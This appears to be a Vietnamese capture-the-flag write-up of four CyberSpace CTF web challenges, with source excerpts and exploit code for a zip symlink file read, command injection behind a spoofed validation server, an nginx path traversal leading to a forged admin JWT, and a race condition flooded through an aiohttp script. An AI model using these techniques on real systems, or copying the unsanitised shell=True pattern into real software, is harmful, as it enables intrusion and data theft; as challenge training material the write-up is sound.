## ZipZone
![image](../CyberSpace%20CTF/img/1.png)

app chỉ cho upload file zip với size < 1MB. chall cung cấp source code, cùng mình view source

![image](../CyberSpace%20CTF/img/2.png)
1. flag được cp vào /tmp/flag.txt
2. ![image](../CyberSpace%20CTF/img/3.png)

route / chấp nhận 2 methods GET và POST, mình focus vào `POST `thôi nhé. dòng 33 dùng split để tách filename và extension ra, sau đó lấy phần extension cho qua hàm `lower()` để thành chữ thường rồi check với 'zip'. Mục đích kiếm tra xem file up lên có phải file zip hay không

sau đó nó tạo ra uuid lưu vào biến `upload_uuid`, sau đó thực hiện unzip bằng `subprocess.call`, lưu vào path tương ứng với uuid và `upload_dir=tmp`

hoàn toàn không có filter về file được zip bên trong, ta có thể lợi dụng lỗ hổng path traversal cũng như symlink bởi file zip

![image](../CyberSpace%20CTF/img/4.png)


### exploit
1. tạo symlink
![image](../CyberSpace%20CTF/img/5.png)
2. upload file
![image](../CyberSpace%20CTF/img/6.png)
3. truy cập vào file/uuid/link_flag để download flag về
![image](../CyberSpace%20CTF/img/7.png)

`FLAG: CSCTF{5yml1nk5_4r3_w31rd}`

## Feature Unlocked
![image](../CyberSpace%20CTF/img/8.png)

tiếp tục 1 chall cung cấp source code, dùng thử rồi view source sau nhé

![image](../CyberSpace%20CTF/img/9.png)
click vào thì 
![image](../CyberSpace%20CTF/img/10.png)

dùng thử thì không thấy gì đặc biệt, mình chỉ biết là cần tìm cách để vào `Feature`, view source nào

![image](../CyberSpace%20CTF/img/11.png)
flag nằm ở folder challenge

```
# main.py


import subprocess
import base64
import json
import time
import requests
import os
from flask import Flask, request, render_template, make_response, redirect, url_for
from Crypto.Hash import SHA256
from Crypto.PublicKey import ECC
from Crypto.Signature import DSS
from itsdangerous import URLSafeTimedSerializer

app = Flask(__name__)
app.secret_key = os.urandom(16)
serializer = URLSafeTimedSerializer(app.secret_key)

DEFAULT_VALIDATION_SERVER = 'http://127.0.0.1:1338'
NEW_FEATURE_RELEASE = int(time.time()) + 7 * 24 * 60 * 60
DEFAULT_PREFERENCES = base64.b64encode(json.dumps({
    'theme': 'light',
    'language': 'en'
}).encode()).decode()


def get_preferences():
    preferences = request.cookies.get('preferences')
    if not preferences:
        response = make_response(render_template(
            'index.html', new_feature=False))
        response.set_cookie('preferences', DEFAULT_PREFERENCES)
        return json.loads(base64.b64decode(DEFAULT_PREFERENCES)), response
    return json.loads(base64.b64decode(preferences)), None


@app.route('/')
def index():
    _, response = get_preferences()
    return response if response else render_template('index.html', new_feature=False)


@app.route('/release')
def release():
    token = request.cookies.get('access_token')
    if token:
        try:
            data = serializer.loads(token)
            if data == 'access_granted':
                return redirect(url_for('feature'))
        except Exception as e:
            print(f"Token validation error: {e}")

    validation_server = DEFAULT_VALIDATION_SERVER
    if request.args.get('debug') == 'true':
        preferences, _ = get_preferences()
        validation_server = preferences.get(
            'validation_server', DEFAULT_VALIDATION_SERVER)

    if validate_server(validation_server):
        response = make_response(render_template(
            'release.html', feature_unlocked=True))
        token = serializer.dumps('access_granted')
        response.set_cookie('access_token', token, httponly=True, secure=True)
        return response

    return render_template('release.html', feature_unlocked=False, release_timestamp=NEW_FEATURE_RELEASE)


@app.route('/feature', methods=['GET', 'POST'])
def feature():
    token = request.cookies.get('access_token')
    if not token:
        return redirect(url_for('index'))

    try:
        data = serializer.loads(token)
        if data != 'access_granted':
            return redirect(url_for('index'))

        if request.method == 'POST':
            to_process = request.form.get('text')
            try:
                word_count = f"echo {to_process} | wc -w"
                output = subprocess.check_output(
                    word_count, shell=True, text=True)
            except subprocess.CalledProcessError as e:
                output = f"Error: {e}"
            return render_template('feature.html', output=output)

        return render_template('feature.html')
    except Exception as e:
        print(f"Error: {e}")
        return redirect(url_for('index'))


def get_pubkey(validation_server):
    try:
        response = requests.get(f"{validation_server}/pubkey")
        response.raise_for_status()
        return ECC.import_key(response.text)
    except requests.RequestException as e:
        raise Exception(
            f"Error connecting to validation server for public key: {e}")


def validate_access(validation_server):
    pubkey = get_pubkey(validation_server)
    try:
        response = requests.get(validation_server)
        response.raise_for_status()
        data = response.json()
        date = data['date'].encode('utf-8')
        signature = bytes.fromhex(data['signature'])
        verifier = DSS.new(pubkey, 'fips-186-3')
        verifier.verify(SHA256.new(date), signature)
        return int(date)
    except requests.RequestException as e:
        raise Exception(f"Error validating access: {e}")


def validate_server(validation_server):
    try:
        date = validate_access(validation_server)
        return date >= NEW_FEATURE_RELEASE
    except Exception as e:
        print(f"Error: {e}")
    return False


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=1337)

```

có 3 route:
1. @app.route('/'): gọi def `get_preferences()` trong đó `get_preferences()` sẽ return về cookie được base64

2. @app.route('/release'): kiểm tra xem có cookie `access_token` không, nếu có `data = serializer.loads(token)` rồi check data có bằng chuỗi `access_granted` , nếu không thì:
2.1: xem có tồn tại para `debug = true` không, nếu có `validation_server` trong cookie `preferences` thì validation_server sẽ được lấy từ cookie này
2.2: sau đó lấy `/pubkey` từ `validation_server`, đem xác thực trả về `date`, so sánh `date` với `NEW_FEATURE_RELEASE`. nếu date >= `NEW_FEATURE_RELEASE` thì return feature_unlock = TRUE

3. @app.route('feature'): có thể thấy form `text` không hề được sanitize trước khi đưa vào `subprocess.check_output()`, do đó tại đây chúng ta có thể khai thác lỗ hổng cmd injection để đọc file bất kì hoặc rce tùy thích

Kết luận: chúng ta có thể thao túng validation_server thông qua `debug=true` và cookie `preferences`, sau đó lợi dụng cmdj để rce 

### exploit

1. Tạo privkey và pubkey trong đó privkey để kí và pubkey để verify

```
from Crypto.PublicKey import ECC

key = ECC.generate(curve='P-256')

with open('pubkey', 'wb') as f:
    f.write(key.public_key().export_key(format='PEM').encode('utf-8'))

with open('privkey', 'wb') as f:
    f.write(key.export_key(format='PEM').encode('utf-8'))
```
2. host 1 con server có chứa 2 route `/` và `/pubkey` , trong đó route `/` chứa date được kí với thời gian sau `NEW_FEATURE_RELEASE`, ở đây mình cho nó 14 ngày luôn
```
from flask import Flask, jsonify
import time
from Crypto.Hash import SHA256
from Crypto.PublicKey import ECC
from Crypto.Signature import DSS

app = Flask(__name__)

def load_private_key():
    with open('privkey', 'rb') as f:
        return ECC.import_key(f.read())

key = load_private_key()

def generate_date_and_sign(date):
    h = SHA256.new(date.encode('utf-8'))
    signer = DSS.new(key, 'fips-186-3')
    signature = signer.sign(h)
    return date, signature.hex()

@app.route('/pubkey', methods=['GET'])
def get_pubkey():
    return key.public_key().export_key(format='PEM'), 200, {'Content-Type': 'text/plain; charset=utf-8'}

@app.route('/', methods=['GET'])
def generate_signed_date():
    date = int(time.time()) + 14 * 24 * 60 * 60
    date, signature = generate_date_and_sign(str(date))

    return jsonify({
        'date': date,
        'signature': signature
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=1337)
```

3. sửa cookie, thêm para debug=true để server đọc được validation_server của mình
![image](../CyberSpace%20CTF/img/12.png)

thành công vào feature unlocked

4. lấy flag
![image](../CyberSpace%20CTF/img/13.png)
và boommm
![image](../CyberSpace%20CTF/img/14.png)


## Trendz
![image](../CyberSpace%20CTF/img/15.png)
tiếp theo 1 chall cung cấp source code, 4 flag được gửi gắm trong chall này, nghe căng vãi nhái =))

chall này mình solve trên local, dựng docker, sau đó chúng ta sẽ có giao diện sau (khi đã login)
 
 
 ![image](../CyberSpace%20CTF/img/16.png)
cho phép tạo post và view post đã tạo, dựa vào des của chall rằng có 1 bài post ẩn cần được đọc. Mình tiến hành đi view source code mà chall cung cấp

đây là app được viết bằng Go
![image](../CyberSpace%20CTF/img/17.png)
![image](../CyberSpace%20CTF/img/18.png)


`DockerFile`
![image](../CyberSpace%20CTF/img/19.png)


`run.sh` 
![image](../CyberSpace%20CTF/img/20.png)

có thể thấy `jwt.secret` được tạo ra ngẫu nhiên, sau đó các biến môi trường được thêm vào và thông tin DB. Cùng với một số value được đặt sẵn trong DB. Như mình đã nói chall có 4 flag và tại đây chúng ta cần lấy `ADMIN_FLAG` tương ứng với FLAG1


và FLAG1 nằm ở `AdminDash.go` 
![image](../CyberSpace%20CTF/img/21.png)

việc cần làm là vào được đây để đọc tất cả các bài posts

view source thì thấy mình cần bypass JWT rồi đó :)) , cần phải có `access_token` để vào được Dashboard

tìm vào `main.go` mình thấy có vài dòng này
![image](../CyberSpace%20CTF/img/22.png)

để vào được AdminDashboard trước tiên chúng ta cần xác thực `AccessToken()`, sau đó `ValidateAdmin()`

`JWTAuth.go`
![image](../CyberSpace%20CTF/img/23.png)
func này sẽ check xem token có được kí bằng HMAC hay không, nếu không sễ báo về lỗi. Từ đây chúng ta sẽ không thể tấn công bằng cách `set alg to None` kinh điển trong jwt :)) 

Thêm nữa là, nếu nó sử dụng HMAC để kí, thì sẽ cần 1 privkey để xác thực, theo source code thì jwt.secret được đặt trong root, nếu lấy được cái này thì coi như xong

Tiếp theo check `ValidateAdmin()`

`ValidateAdmin.go`
![image](../CyberSpace%20CTF/img/24.png)

Tại đây kiểm tra xem yêu cầu có mã thông báo JWT hợp lệ với vai trò "admin" hay "superadmin" hay không. Đầu tiên, nó tìm kiếm mã thông báo trong tiêu đề "Authorization" hoặc cookie. Nếu không tìm thấy hoặc không hợp lệ, nó sẽ chuyển hướng người dùng để lấy mã thông báo truy cập hoặc trả về lỗi 403 Unauthorized.

### Câu hỏi đặt ra: nếu mình set role to admin và kí nó hợp lệ với HMAC, rồi có thể lấy được jwt.secret thì sao ? -> DONE! 

### exploit

chúng ta cần có được filw jwt.secret
check `nginx.conf`
![image](../CyberSpace%20CTF/img/25.png)

dòng 23,24 trong file conf này cho thấy /static được alias thành /app/static/ mà không có hạn chế nào với thư mục này. Tại đây ta có thể tận dụng Path traversal để đọc file `jwt.secret` bẳng `/app/static/../jwt.secret`

![image](../CyberSpace%20CTF/img/26.png)
thành công lấy được `jwt.secret`

giờ tạo JWT với role = admin 
![image](../CyberSpace%20CTF/img/27.png)

thay thế `accesstoken` và truy cập `/admin/dashboard`

![image](../CyberSpace%20CTF/img/28.png)

vô post là có flag nhé ae, mình làm local nên kh lấy flag nữa

## Trendzz
![image](../CyberSpace%20CTF/img/29.png)

tiếp tục với Trendzz nào, theo des thì chúng ta cần phải post hơn 12 bài mới nhận được gift

![image](../CyberSpace%20CTF/img/30.png)
theo `run.sh` thì flag nằm ở biến env `POST_FLAG`

flag nằm ở trong `posts.go`
![image](../CyberSpace%20CTF/img/31.png)

đặc biệt là chúng ta không thể post quá 10 , cần bypass cái này để lấy được gift
![image](../CyberSpace%20CTF/img/32.png)

func DisolayFlag được gọi ở endpoint /flag
![image](../CyberSpace%20CTF/img/33.png)

### câu hỏi: nếu upload nhiều lần cùng lúc thì có thể bypass check 10 posts không? Mình nghĩ ngay tới race conditions, nhưng để biết vuln nằm ở đâu mình đã tốn khá nhiều thời gian để tìm

và tại đây:
![image](../CyberSpace%20CTF/img/34.png)
func `CheckNoOfPosts` kiểm tra xem số lượng posts hiện có trước khi cho phép insert 1 post mới. Nếu nhiều req được gửi tới cùng lúc, các yêu cầu có thể nhận được điều kiện số lượng post < 10 và đều được insert vào DB. Điều này xảy ra vì việc check số lượng posts không được thực hiện 1 cách đúng đắn, cho phép các yêu cầu đồng thời bỏ qua giới hạn

### exploit
trước tiên chúng ta cần tìm hiểu về `asyncio` với lib `aiohttp` để có thể gửi nhiều req đồng thời

```
import aiohttp
import asyncio

# endpoint to create posts
url = 'http://localhost/user/posts/create'
# get the accesstoken from the cookies upon login
cookies = {
    "accesstoken": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MjU0Mjg4MDksImlhdCI6MTcyNTQyODIwOSwicm9sZSI6InVzZXIiLCJ1c2VybmFtZSI6InEifQ.GE0rPczdp8HuqtXXGTyFxtyoHu3itcEM9MkV9IGrAMc"
}

# POST Data
post_data = {
    "title": "Race Condition Test",
    "data": "This is the data for the post"
}

async def send_post(session, semaphore):
    async with semaphore:
        async with session.post(url, json=post_data, cookies=cookies) as response:
            text = await response.text()
            print(f"Response: {text}")

async def main():
    concurrency_limit = 200  # Limit the number of concurrent requests
    semaphore = asyncio.Semaphore(concurrency_limit)

    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=concurrency_limit)) as session:
        tasks = [send_post(session, semaphore) for _ in range(50)]
        await asyncio.gather(*tasks)

# Run the main function
asyncio.run(main())


#python3 race_conditions.py
```



vào endpoint /user/flag boomm
![image](../CyberSpace%20CTF/img/35.png)



















